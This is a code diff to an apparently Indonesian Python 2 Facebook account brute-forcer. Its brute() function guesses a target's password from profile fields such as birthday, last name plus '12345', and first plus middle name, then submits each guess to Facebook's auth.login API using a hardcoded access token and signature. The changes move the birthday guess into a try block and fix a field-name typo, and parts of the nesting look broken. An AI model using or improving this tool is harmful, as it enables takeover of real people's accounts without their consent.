@@ -99,19 +99,21 @@ def brute():
                         elif "www.facebook.com" in js["error_msg"]:
                             print " Akun Kena cekpoint: " + sandi5
                         else:
-
-                            tgl = jsl["birthday"]
-                            sandi6 = tgl.replace("/", "")
-                            print sandi6
-                            log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + target + "&locale=en_US&password=" + sandi6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-                            js = json.load(log)
                             try:
+
+                                tgl = jsl["birthday"]
+                                sandi6 = tgl.replace("/", "")
+                                print sandi6
+                                log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + target + "&locale=en_US&password=" + sandi6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+                                js = json.load(log)
+                            
                                 if "access_token" in js:
                                     print " Found: " + sandi6
                                 elif "www.facebook.com" in js["error_msg"]:
                                     print " Akun Kena Cekpoint: " + sandi6
                             except KeyError:
-                                print "Tidak Ada Birthday"
+                                print " Tidak ada Birthday"
+                     
                             else:
                                 sandi7 = jsl["last_name"] + "12345"
                                 print sandi7
@@ -131,7 +133,7 @@ def brute():
                                     elif "www.facebook.com" in js["error_msg"]:
                                         print " Akun Kena Cekpoint" + sandi8
                                     else:
-                                        sandi9 = jsl["firs_name"] + jsl["middle_name"]
+                                        sandi9 = jsl["first_name"] + jsl["middle_name"]
                                         print sandi9
 
                                         log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + target + "&locale=en_US&password=" + sandi9 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
